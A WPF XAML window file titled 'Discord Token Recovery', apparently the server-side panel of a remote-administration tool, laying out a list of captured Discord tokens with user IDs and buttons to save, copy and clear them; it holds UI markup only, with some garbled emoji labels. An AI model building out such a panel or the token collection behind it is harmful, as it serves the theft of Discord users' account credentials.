<Window x:Class="RemoteAdmin.Server.DiscordTokenWindow"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        xmlns:d="http://schemas.microsoft.com/expression/blend/2008"
        xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"
        mc:Ignorable="d"
        Title="Discord Token Recovery" Height="600" Width="1000"
        WindowStartupLocation="CenterScreen"
        Background="#1E1E1E">

    <Window.Resources>
        <!-- Dark Theme Colors -->
        <SolidColorBrush x:Key="BackgroundBrush" Color="#1E1E1E"/>
        <SolidColorBrush x:Key="ForegroundBrush" Color="#FFFFFF"/>
        <SolidColorBrush x:Key="AccentBrush" Color="#0078D4"/>
        <SolidColorBrush x:Key="BorderBrush" Color="#3F3F46"/>
        <SolidColorBrush x:Key="HoverBrush" Color="#2D2D30"/>

        <!-- Button Style -->
        <Style x:Key="DarkButton" TargetType="Button">
            <Setter Property="Background" Value="#3F3F46"/>
            <Setter Property="Foreground" Value="White"/>
            <Setter Property="BorderBrush" Value="#007ACC"/>
            <Setter Property="BorderThickness" Value="1"/>
            <Setter Property="Padding" Value="10,5"/>
            <Setter Property="Margin" Value="5"/>
            <Setter Property="Cursor" Value="Hand"/>
            <Setter Property="Template">
                <Setter.Value>
                    <ControlTemplate TargetType="Button">
                        <Border Background="{TemplateBinding Background}"
                                BorderBrush="{TemplateBinding BorderBrush}"
                                BorderThickness="{TemplateBinding BorderThickness}"
                                CornerRadius="3">
                            <ContentPresenter HorizontalAlignment="Center"
                                            VerticalAlignment="Center"
                                            Margin="{TemplateBinding Padding}"/>
                        </Border>
                        <ControlTemplate.Triggers>
                            <Trigger Property="IsMouseOver" Value="True">
                                <Setter Property="Background" Value="#007ACC"/>
                            </Trigger>
                            <Trigger Property="IsPressed" Value="True">
                                <Setter Property="Background" Value="#005A9E"/>
                            </Trigger>
                        </ControlTemplate.Triggers>
                    </ControlTemplate>
                </Setter.Value>
            </Setter>
        </Style>

        <!-- ListView Style -->
        <Style x:Key="DarkListView" TargetType="ListView">
            <Setter Property="Background" Value="#252526"/>
            <Setter Property="Foreground" Value="White"/>
            <Setter Property="BorderBrush" Value="#3F3F46"/>
            <Setter Property="BorderThickness" Value="1"/>
        </Style>

        <!-- ListViewItem Style -->
        <Style TargetType="ListViewItem">
            <Setter Property="Background" Value="Transparent"/>
            <Setter Property="Foreground" Value="White"/>
            <Setter Property="Padding" Value="5"/>
            <Style.Triggers>
                <Trigger Property="IsMouseOver" Value="True">
                    <Setter Property="Background" Value="#2D2D30"/>
                </Trigger>
                <Trigger Property="IsSelected" Value="True">
                    <Setter Property="Background" Value="#007ACC"/>
                    <Setter Property="Foreground" Value="White"/>
                </Trigger>
            </Style.Triggers>
        </Style>

        <!-- TextBox Style -->
        <Style x:Key="DarkTextBox" TargetType="TextBox">
            <Setter Property="Background" Value="#3F3F46"/>
            <Setter Property="Foreground" Value="White"/>
            <Setter Property="BorderBrush" Value="#007ACC"/>
            <Setter Property="BorderThickness" Value="1"/>
            <Setter Property="Padding" Value="5"/>
            <Setter Property="CaretBrush" Value="White"/>
        </Style>
    </Window.Resources>

    <Grid Margin="10">
        <Grid.RowDefinitions>
            <RowDefinition Height="Auto"/>
            <RowDefinition Height="*"/>
            <RowDefinition Height="Auto"/>
        </Grid.RowDefinitions>

        <!-- Top Controls -->
        <StackPanel Grid.Row="0" Orientation="Horizontal" Margin="0,0,0,10">
            <Button Content="ðŸ”„ Refresh" Style="{StaticResource DarkButton}" Click="Refresh_Click" Width="100"/>
            <Button Content="ðŸ’¾ Save All" Style="{StaticResource DarkButton}" Click="SaveAll_Click" Width="100"/>
            <Button Content="ðŸ’¾ Save Selected" Style="{StaticResource DarkButton}" Click="SaveSelected_Click" Width="120"/>
            <Button Content="ðŸ“‹ Copy All" Style="{StaticResource DarkButton}" Click="CopyAll_Click" Width="100"/>
            <Button Content="ðŸ“‹ Copy Selected" Style="{StaticResource DarkButton}" Click="CopySelected_Click" Width="120"/>
            <Button Content="ðŸ—‘ï¸ Clear All" Style="{StaticResource DarkButton}" Click="ClearAll_Click" Width="100"/>
            <Button Content="ðŸ—‘ï¸ Clear Selected" Style="{StaticResource DarkButton}" Click="ClearSelected_Click" Width="120"/>
        </StackPanel>

        <!-- Token List -->
        <ListView x:Name="lstTokens" 
                  Grid.Row="1" 
                  Style="{StaticResource DarkListView}"
                  GridViewColumnHeader.Click="ListView_ColumnHeaderClick"
                  SelectionMode="Extended">
            <ListView.View>
                <GridView>
                    <GridViewColumn Header="Token" Width="600" DisplayMemberBinding="{Binding Token}"/>
                    <GridViewColumn Header="Type" Width="100" DisplayMemberBinding="{Binding TokenType}"/>
                    <GridViewColumn Header="User ID" Width="150" DisplayMemberBinding="{Binding UserId}"/>
                    <GridViewColumn Header="Status" Width="100" DisplayMemberBinding="{Binding Status}"/>
                </GridView>
            </ListView.View>
            <ListView.ContextMenu>
                <ContextMenu Background="#2D2D30" Foreground="White">
                    <MenuItem Header="ðŸ’¾ Save All" Click="SaveAll_Click"/>
                    <MenuItem Header="ðŸ’¾ Save Selected" Click="SaveSelected_Click"/>
                    <Separator/>
                    <MenuItem Header="ðŸ“‹ Copy All" Click="CopyAll_Click"/>
                    <MenuItem Header="ðŸ“‹ Copy Selected" Click="CopySelected_Click"/>
                    <Separator/>
                    <MenuItem Header="ðŸ”„ Refresh" Click="Refresh_Click"/>
                    <Separator/>
                    <MenuItem Header="ðŸ—‘ï¸ Clear All" Click="ClearAll_Click"/>
                    <MenuItem Header="ðŸ—‘ï¸ Clear Selected" Click="ClearSelected_Click"/>
                </ContextMenu>
            </ListView.ContextMenu>
        </ListView>

        <!-- Bottom Controls - Format -->
        <Grid Grid.Row="2" Margin="0,10,0,0">
            <Grid.ColumnDefinitions>
                <ColumnDefinition Width="Auto"/>
                <ColumnDefinition Width="*"/>
            </Grid.ColumnDefinitions>

            <TextBlock Grid.Column="0" 
                       Text="Output Format:" 
                       Foreground="White" 
                       VerticalAlignment="Center" 
                       Margin="0,0,10,0"/>
            <TextBox x:Name="txtFormat" 
                     Grid.Column="1" 
                     Style="{StaticResource DarkTextBox}"
                     Text="TOKEN | TYPE | USERID | STATUS"
                     ToolTip="Use TOKEN, TYPE, USERID, STATUS as placeholders"/>
        </Grid>
    </Grid>
</Window>
